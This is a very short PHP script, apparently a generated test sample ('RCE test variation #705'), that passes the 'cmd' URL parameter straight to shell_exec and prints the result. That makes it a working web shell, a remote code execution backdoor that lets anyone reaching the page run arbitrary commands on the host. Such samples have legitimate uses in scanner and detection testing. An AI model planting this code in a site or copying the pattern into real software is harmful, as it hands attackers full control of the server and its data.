<?php
// RCE test variation #705
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>